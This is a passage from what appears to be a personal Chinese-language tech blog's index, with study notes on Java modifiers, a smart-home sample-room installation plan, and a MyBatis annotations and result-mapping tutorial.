class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Granddad</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drink</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;爷爷爱喝酒&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Father</span> <span class="keyword">extends</span> <span class="title">Granddad</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;爸爸爱抽烟&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mother</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;妈妈爱跳舞&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line"><span class="comment">// 此时，Son类中就同时拥有drink方法以及smoke方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h1><h2 id="package"><a href="#package" class="headerlink" title="package"></a>package</h2><ol><li>包的概念<ul><li>包就是文件夹，用来管理类文件的</li></ul></li><li>包的定义格式<ul><li>package包名;(多级包用.分开)</li><li>例如: package.com.test.dome;</li></ul></li><li>带包编译和带包运行<ul><li>带包编译: javac -d .类名.java<ul><li>例如: javac -d .com.test.dome.Hellorld.java</li></ul></li><li>带包运行: java包名+类名<ul><li>例如:java.com.test.dome.Hellword</li></ul></li></ul></li></ol><hr><h2 id="Import"><a href="#Import" class="headerlink" title="Import"></a>Import</h2><ul><li>导包的意义<ul><li>使用不同包下的类时，使用的时候要写类的全路径</li></ul></li><li>导包的格式<ul><li>格式:import 包名;</li></ul></li></ul><hr><h2 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h2><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202111061853046.png"></p><hr><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><ul><li>final关键字的作用<ul><li>final代表最终的意思，可以修饰成员方法，成员变量，类</li></ul></li><li>final修饰类、方法、变量的效果<ul><li>final修饰类：该类不能被继承(不能有子类、但是可以有父类)</li><li>final修饰方法： 该方法不能被重写</li><li>final修饰变量：表明该变量是一个常量，不能再次赋值</li></ul></li></ul><hr><h2 id="final修饰局部变量"><a href="#final修饰局部变量" class="headerlink" title="final修饰局部变量"></a>final修饰局部变量</h2><ul><li><p>final修饰基本数据类型变量</p><ul><li>final修饰之的基本类型的数据值不能发生改变</li></ul></li><li><p>final修饰引用数据类型变量</p><ul><li><p>final修饰指的是引用类型的地址不能发生改变，但是地址里边的内容是可以放生改变的</p></li><li><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">final</span> Student s = <span class="keyword">new</span> Student(<span class="number">23</span>);</span><br><span class="line">s = <span class="keyword">new</span> Student(<span class="number">24</span>); <span class="comment">// 错误</span></span><br><span class="line">s.setAge(<span class="number">24</span>); <span class="comment">// 正确</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><ul><li>static的概念<ul><li>static关键字是静态的意思，可以修饰[成员方法]、[成员变量]</li></ul></li><li>static修饰的特点<ol><li>被类的所有对象共享，这也是我们判断是否使用静态关键字的条件</li><li>可以通过类名调用，当然也可以通过对象调用</li></ol></li></ul><hr><h2 id="static访问特点"><a href="#static访问特点" class="headerlink" title="static访问特点"></a>static访问特点</h2><ul><li>static的访问特点<ul><li>非静态的成员方法<ul><li>能访问静态的成员变量</li><li>能访问非静态的成员变量</li><li>能访问静态的成员方法</li><li>能访问非静态的成员方法</li></ul></li><li>静态成员方法<ul><li>能访问静态成员变量</li><li>能访问静态的成员方法</li></ul></li><li>总结<ul><li>静态成员只能访问静态成员</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能家居设备安装方案</title>
      <link href="/2021/11/04/%E8%AE%BE%E5%A4%87%E5%AE%89%E8%A3%85%E6%96%B9%E6%A1%88/"/>
      <url>/2021/11/04/%E8%AE%BE%E5%A4%87%E5%AE%89%E8%A3%85%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<center><h1>    设备安装方案    </h1></center><h1 id="1、引言"><a href="#1、引言" class="headerlink" title="1、引言"></a>1、引言</h1><ul><li>根据贵公司的需求，以智能家居样板操作间为承载平台，为了方便顾客现场体验，我们积极设想并设计出设备安装部署方案</li></ul><h1 id="2、传感器设备物理地址编辑"><a href="#2、传感器设备物理地址编辑" class="headerlink" title="2、传感器设备物理地址编辑"></a>2、传感器设备物理地址编辑</h1><ul><li><p>为了更好的部署智能家居样板间，我们设计了联网设备的物理地址、panid、板号、通道号。</p></li><li><p>具体请参考1-1传感器设备物理地址编辑</p></li><li><center>1-1传感器设备物理地址编辑</center><table><thead><tr><th align="center">序号</th><th align="center">设备名称</th><th align="center">物理地址</th><th align="center">panId</th><th align="center">板号</th><th align="center">通道号</th></tr></thead><tbody><tr><td align="center">01</td><td align="center">温湿度传感器</td><td align="center">00-00-00-00-1B-11-13-01</td><td align="center">01</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">02</td><td align="center">大气压传感器</td><td align="center">00-00-00-00-1B-11-13-02</td><td align="center">02</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">03</td><td align="center">二氧化氮检测器</td><td align="center">00-00-00-00-1B-11-13-03</td><td align="center">03</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">04</td><td align="center">pm2.5检测器</td><td align="center">00-00-00-00-1B-11-13-04</td><td align="center">04</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">05</td><td align="center">燃气检测器</td><td align="center">00-00-00-00-1B-11-13-05</td><td align="center">05</td><td align="center">1B-11</td><td align="center">13</td></tr><tr><td align="center">06</td><td align="center">人体红外探测器</td><td align="center">00-00-00-00-1B-11-13-06</td><td align="center">06</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">07</td><td align="center">光照传感器</td><td align="center">00-00-00-00-1B-11-13-07</td><td align="center">07</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">08</td><td align="center">烟雾传感器</td><td align="center">00-00-00-00-1B-11-13-08</td><td align="center">08</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">09</td><td align="center">报警的</td><td align="center">00-00-00-00-1B-11-13-9</td><td align="center">09</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">10</td><td align="center">换气扇</td><td align="center">00-00-00-00-1B-11-13-10</td><td align="center">10</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">11</td><td align="center">射灯</td><td align="center">00-00-00-00-1B-11-13-10</td><td align="center">11</td><td align="center"></td><td align="center"></td></tr></tbody></table></li></ul><h1 id="3、计算机网络设备IP编辑"><a href="#3、计算机网络设备IP编辑" class="headerlink" title="3、计算机网络设备IP编辑"></a>3、计算机网络设备IP编辑</h1><ul><li><p>为了更好控制联网设备，我们设计了ip进行对设备的联网控制</p></li><li><p>具体请参考1-2计算机网络设备ip编辑</p></li><li><center>1-2计算机网络设备ip编辑</center><table><thead><tr><th align="center">序号</th><th align="center">设备名称</th><th align="center">网络设备IP</th><th align="right">子网掩码</th></tr></thead><tbody><tr><td align="center">01</td><td align="center">服务器</td><td align="center">18.0.10.1</td><td align="right"></td></tr><tr><td align="center">02</td><td align="center">路由器</td><td align="center">18.0.10.2</td><td align="right">255.255.255.0</td></tr><tr><td align="center">03</td><td align="center">A8智能网关</td><td align="center">18.0.10.3</td><td align="right"></td></tr><tr><td align="center">04</td><td align="center">嵌入式移动开发箱</td><td align="center">18.0.10.4</td><td align="right"></td></tr></tbody></table></li></ul><h1 id="4、安装工期及进度"><a href="#4、安装工期及进度" class="headerlink" title="4、安装工期及进度"></a>4、安装工期及进度</h1><ul><li>我们以智能家居样板操作间作为施工，具体开工时间是10与18日结束时期是10月18日，周期为3小时。</li></ul><h1 id="5、安装注意事项"><a href="#5、安装注意事项" class="headerlink" title="5、安装注意事项"></a>5、安装注意事项</h1><ul><li>为了防止安装时出现安全隐患，我们将严格遵守电工规范，断电操作，注意电路正负极，注意接线柱的电压变化，安装时注意团队配合，在他人登梯子的时候必须有人扶助梯子，穿着专业的服饰。</li></ul><h1 id="6、项目施工基本条件及注意事项"><a href="#6、项目施工基本条件及注意事项" class="headerlink" title="6、项目施工基本条件及注意事项"></a>6、项目施工基本条件及注意事项</h1><ul><li>为了方便贵公司参观，我们会将智能家居操作样板间提前部署在贵公司，届时期间可能会有断电、断网的情况发生、由于有些电器安装比较困难，安装时可能会伴随着噪音，我们会尽快完工希望贵公司理解。</li></ul><h1 id="7、合理优化方案"><a href="#7、合理优化方案" class="headerlink" title="7、合理优化方案"></a>7、合理优化方案</h1><ul><li>由于考虑到贵公司不是此方面的专业，我们根据需求将提出如下几点建议<ol><li>为了方便顾客操作，建议购买红外转发器从而使设备更好的控制。</li><li>购入更多的传感器，并将数据加以统计分析。</li><li>定期联系我们对智能电器设备的检查与维护。</li><li>可为智能设备单独分化一个网络频段使网络控制设备更加的稳定。</li></ol></li></ul><h1 id="关于第三阶段请看github"><a href="#关于第三阶段请看github" class="headerlink" title="关于第三阶段请看github"></a>关于第三阶段请看github</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SmartHome(第一阶段) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SmartHome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis入门(四)</title>
      <link href="/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E5%9B%9B)/"/>
      <url>/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<center><h1>注解开发</h1></center><h1 id="使用注解开发"><a href="#使用注解开发" class="headerlink" title="使用注解开发"></a>使用注解开发</h1><h2 id="面向接口编程"><a href="#面向接口编程" class="headerlink" title="面向接口编程"></a>面向接口编程</h2><ul><li>大家之前都学过面向对象编程，也学习过接口，但是在真正开发中，很多时候我们会选择面向接口编程</li><li>原因是:<ul><li>解耦合</li><li>可扩展性</li><li>提高复用</li><li>分层开发</li><li>上层不用管具体的的实现，大家都遵守共同的标准，使得开发变得容易，规范性更好</li></ul></li><li>在一个面向对象的系统中，系统的各种功能是由许许多多的不同对象写作完成的，在这种情况下，各个对象内部是如何实现自己的，对系统设计人员说就不那么重要了；</li><li>而各个对象之间协作关系成为系统设计的关键，小到不同类之间的通信，大到各种模块的交互，在系统设计之初都是要着重考虑的，这也是系统设计的住哟啊工作内容，面向接口编程就是指按照这种思想来编程的</li><li>关于接口的理解<ul><li>接口从更深层次的理解，应是定义(规范, 约束)与实现(实名分离的原则)的分离</li><li>接口的本身反映了系统设计人员对系统的抽象理解</li><li>接口应有两类<ul><li>第一类是对一个个体的抽象，它可对应为一个抽象体</li><li>第二类是对一个个体某一方面的抽象，即形成一个抽象面</li><li>一个体有可能有多个抽象面， 抽象体与抽象面是有区别的</li></ul></li></ul></li><li>三个面向区别<ul><li>面向对象是指，我们考虑东西的时候，以一个对象为单位，考虑它的属性及方法</li><li>面向过程是指，我们考虑问题的时候，以一个具体流程为单位(事物过程)，考虑它的实现</li><li>接口设计与非接口设计是指对复用技术而言，与面向对象(过程)不是一个问题更多的体现就是对系统整体的架构</li></ul></li></ul><hr><h2 id="使用注解开发-1"><a href="#使用注解开发-1" class="headerlink" title="使用注解开发"></a>使用注解开发</h2><ul><li><p>注解在接口上实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">   <span class="function">List&lt;User&gt; <span class="title">selectAll</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>需要在核心配置文件中绑定接口</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;com.gwl.mapper.UserMapper&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">    UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.selectAll().forEach(System.out::println);</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>本质: 反射机制</p></li><li><p>底层: 动态代理</p></li></ul><h1 id="注解完成增删改查"><a href="#注解完成增删改查" class="headerlink" title="注解完成增删改查"></a>注解完成增删改查</h1><h2 id="CRUD"><a href="#CRUD" class="headerlink" title="CRUD"></a>CRUD</h2><ul><li><p><code>我们必须要把注解类绑定注册到mybatis核心配置文件中</code></p></li><li><p>我们可以在工具类创建的时候实现自动提交事物</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title">getSqlSession</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">return</span>  sqlSessionFactory.openSession(<span class="keyword">true</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h2><ul><li><p>接口加注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Insert(&quot;insert into user(id, name, owd) values(#&#123;id&#125;, #&#123;name&#125;, #&#123;password&#125;)&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">addUser</span><span class="params">(User user)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">    UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.addUser(<span class="keyword">new</span> User(<span class="number">8</span>, <span class="string">&quot;java&quot;</span>, <span class="string">&quot;123&quot;</span>));</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><ul><li><p>接口加注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Delete(&quot;delete from user where id = #&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dele</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span>&#123;</span><br><span class="line">     MybatisUtils.getSqlSession().getMapper(UserMapper.class).dele(<span class="number">9</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h2><ul><li><p>接口加注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Update(&quot;update user set name=#&#123;name&#125;, owd=#&#123;password&#125; where id = #&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">(User user)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>&#123;</span><br><span class="line">    MybatisUtils.getSqlSession()</span><br><span class="line">            .getMapper(UserMapper.class)</span><br><span class="line">            .update(<span class="keyword">new</span> User(<span class="number">1</span>, <span class="string">&quot;ll&quot;</span>, <span class="string">&quot;zxcv&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><ul><li><p>接口加注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    方法存在多个参数， 所有的参数前面必须加上@Param(&quot;id&quot;)注解</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from user where id = #&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function">User <span class="title">getUserById</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> <span class="keyword">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">    UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    User userById = mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">    System.out.println(userById);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Param-注解"><a href="#Param-注解" class="headerlink" title="@Param()注解"></a>@Param()注解</h2><ul><li>基本类型或者String类型 需要加上</li><li>引用类型不需要</li><li>如果只有一个基本类型的话 可以忽略</li><li>我们在sql中引用的就是我们这里的@Param()中这顶的属性名</li></ul><hr><h1 id="多对一"><a href="#多对一" class="headerlink" title="多对一"></a>多对一</h1><ul><li>多个学生 对应一个老师</li><li>对于学生而言 多个学生关联一个老师【多对一】</li><li>对于老师而言 集合 一个老师有很多学生【一对多】</li></ul><h2 id="按照查询嵌套处理"><a href="#按照查询嵌套处理" class="headerlink" title="按照查询嵌套处理"></a>按照查询嵌套处理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.gwl.mapper.StudentMapper&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getStudentAll&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;StudentTeacher&quot;</span>&gt;</span></span><br><span class="line">        select * from student</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;StudentTeacher&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Student&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        复杂查询的属性， 我们需要单独处理， association对象 collection集合--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;Teacher&quot;</span> <span class="attr">select</span>=<span class="string">&quot;getTeacher&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getTeacher&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Teacher&quot;</span>&gt;</span></span><br><span class="line">        select * from teacher</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="按照结果嵌套处理"><a href="#按照结果嵌套处理" class="headerlink" title="按照结果嵌套处理"></a>按照结果嵌套处理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getStudentAll2&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;getStudent&quot;</span>&gt;</span></span><br><span class="line">    select s.id sid, s.name sname, t.name tname from student s, teacher t where s.tid = t.id</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;getStudent&quot;</span> <span class="attr">type</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;sid&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;sname&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">column</span>=<span class="string">&quot;tname&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;Teacher&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;tname&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h1><ul><li><p>比如一个老师拥有多个学生</p><ul><li><p>按照结果嵌套处理</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getTeacher&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;TeacherStudent&quot;</span>&gt;</span></span><br><span class="line">    select s.id sid, s.name sname, t.id tid</span><br><span class="line">    from student s, teacher t</span><br><span class="line">    where s.id = t.id and t.id = #&#123;tid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    按照结果查询--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;TeacherStudent&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Teacher&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;tname&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;student&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Student&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;sid&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;sname&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>按照查询嵌套处理</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getTeacher2&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;TeacherStudent2&quot;</span>&gt;</span></span><br><span class="line">select * from teacher where id = #&#123;tid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;TeacherStudent2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Teacher&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;students&quot;</span> <span 